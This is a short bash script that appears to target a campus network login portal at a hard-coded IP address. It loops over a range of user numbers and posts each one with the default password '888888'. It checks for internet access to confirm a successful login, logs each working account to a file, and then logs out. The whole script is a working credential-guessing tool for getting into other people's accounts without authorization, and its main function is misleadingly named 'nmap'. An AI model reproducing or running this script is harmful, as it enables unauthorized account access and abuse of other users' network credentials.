#!/bin/bash
# File Name: login.sh
# Author:labulaka
# mail:labulaka521@live.cn
# Created Time: 2017-03-02

nmap (){
login_url="http://222.24.63.10"
curl -sd "DDDDD=0290310$user&upass=888888&0MKKey=%B5%C7%C2%BC+Login" $login_url >/dev/null 2>&1 
ping -w 3 -c 3 www.baidu.com >/dev/null 2>&1
if [ $? -eq 0 ];then
	echo "0290310$user success"
	echo "0290310$user" >> usernum
	curl http://222.24.63.10/F.htm >/dev/null 2>&1
else
	echo "0290310$user fail"
fi
}
judge_number (){
	read -p "please input a number :" num1
	read -p "please input greater than last number :" num2
	if [ $num2 -gt $num1 ];then
		break
	else
		echo "error! please resume load!!"
	fi
}
if [ -f usernum ];then
	read -p "do you want to override usernum file[y or n ]:" ride
	case $ride in
		Y|y)
			echo > usernum
			;;
		N|n)
			echo
			;;
		*)
			echo "please input y or n"
			;;
	esac
fi
judge_number
for user in `seq -w $num1 $num2`
do
	nmap
done
